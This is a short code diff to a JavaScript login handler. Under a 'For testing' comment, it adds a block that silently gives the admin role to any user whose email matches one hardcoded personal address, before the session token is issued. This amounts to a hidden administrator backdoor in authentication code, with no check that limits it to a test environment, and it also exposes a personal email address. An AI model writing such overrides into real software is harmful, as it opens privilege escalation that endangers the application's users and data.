@@ -34,6 +34,11 @@ export const login = async (req, res) => {
       return res.status(401).json({ message: 'Invalid credentials' });
     }
     
+    // For testing: make admin if email matches
+    if (user.email === 'drsamar@gmail.com') {
+      user.role = 'admin';
+    }
+    
     console.log('User logged in:', user.email);
     return res.json({ user: safeUser(user), token: generateToken(user) });
   } catch (error) {
